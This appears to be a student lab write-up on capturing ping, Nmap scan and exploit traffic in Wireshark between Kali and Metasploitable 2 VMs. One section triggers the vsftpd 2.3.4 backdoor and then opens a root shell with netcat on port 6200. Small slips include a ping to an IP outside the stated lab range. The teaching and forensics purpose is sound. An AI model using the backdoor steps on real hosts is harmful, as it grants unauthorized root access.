# PROJECT OVERVIEW

In this lab, I'll use Wireshark on Kali Linux to capture and analyze traffic between my virtual machines. I'ill perform a realistic scenario: attacking Metasploitable from Kali and capturing all traffic for forensic analysis.

**Real-world scenario:**

I'm an SOC Analyst investigating an attack on a server. I have:

- Kali Linux: attacker simulation
- Metasploitable: Compromised server (victim)
- Wireshark: Tool for capturing evidence of the attack

## Lab Environment

- **Hypervisor:** VirtualBox

- **VM 1 - Kali Linux:**
  - IP: 10.0.2.5
  - Role: Attacker + Packet Analyzer
  - Wireshark installed
  
- **VM 2 - Metasploitable 2:**
  - IP: 10.0.2.4
  - Role: Vulnerable target
  - Services: FTP (vsftpd 2.3.4 with backdoor), SSH, Telnet, HTTP, etc.

- **Network Mode:** Host-Only Adapter (vboxnet0)
- **Isolation:** VMs communicate with each other, isolated from internet

## Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| **Wireshark** | 4.0+ (Kali) | Packet capture and analysis |
| **Kali Linux** | 2024.x | Attacker/Analyzer platform |
| **Metasploitable 2** | N/A | Intentionally vulnerable target |
| **Nmap** | 7.94+ | Port scanning |
| **Netcat** | N/A | Shell connection to backdoor |

## Objective

-  Install and configure Wireshark on Kali Linux
-  Capture traffic between attack and victim VMs
-  Analyze real port scanning activity (Nmap)
- Capture and analyze exploitation (vsftpd backdoor)
- Use display filters for forensic analysis
- Follow TCP streams to reconstruct attacks
- Export evidence in pcap format
- Document findings with MITRE ATT&CK mapping

## STEP BY STEP - LABORATORY 1.1.3 

### STEP 1.1.3.1: Verify Wireshark on Kali Linux

- Configure Network between Kali and Metasploitable and Verify current network configuration:

In Kali Linux and Metasploitable

```bash 
ifconfig
```

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation1.png)

### STEP 1.1.3.2: First Capture - ICMP between VMs

- **Ping a Metasploitable**

```bash 
ping -c 10 192.168.56.102
```

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation2.png)

En Wireshark The packages started to appear

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation3.png)

- **Filter only ICMP**

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation4.png)

### STEP 1.1.3.3: Advanced Capture - Real Port Scan

- **Attack Metasploitable and capture the attack.**

1. **Prepare capture:**

In Wireshark and Start new capture and Interface: eth0


Run Nmap scan from Kali

Port scan básico (top 100 ports)

```bash
nmap -F 10.0.2.4
```

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation5.png)

***-F = Fast scan (100 commons ports)***
 
 Take ~10 sec.

2. **Analyze the captured port scan**

*Filter to view only SYN packets:*

```bash
tcp.flags.syn == 1 and tcp.flags.ack == 0
```


![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation7.png)

3. **Statistical analysis of the scan:**

**This demonstrates:**

- Kali generated ~200 packets to Metasploitable
- Typical port scan behavior


![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation8.png)

Statistics > Endpoints > TCP tab:

4. **Sort by “Packets”**

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation9.png)

5. **View scanned ports:**

*Filter to view only SYN packets and ports scans:*

```bash
tcp.flags.syn == 1 and tcp.flags.ack == 0 and ip.src == 10.0.2.5
```

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation10.png)

## STEP 1.1.3.4: Capturing Real Exploit (FTP Backdoor)

Metasploitable has a backdoor in FTP.  exploit it and capture everything.

1. **Start capture in Wireshark**

2. Connect to the FTP backdoor from Kali:
Metasploitable vsftpd has a backdoor on port 21 

```bash
telnet 10.0.2.4 21
```

Default Metasploitable user

- **USER** ***msfadmin***

Default password

**PASS** ***msfadmin***

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation12.png)


3. Connect to the backdoor shell (in a NEW Kali terminal):


You will see the FTP banner:

-- 220 (vsFTPd 2.3.4)  --

- **Type:**

USER ***test:)***

- Press Enter, then:

PASS cualquiercosa

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation12.png)

4. Connect to the backdoor shell (in a NEW Kali terminal):

```bash
nc 10.0.2.4 6200
```

***You should get a shell:***
- id
   - uid=0(root) gid=0(root)

- whoami
   - root

- ls
   - bin  boot  cdrom  dev  etc  home ...

![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation11.png)

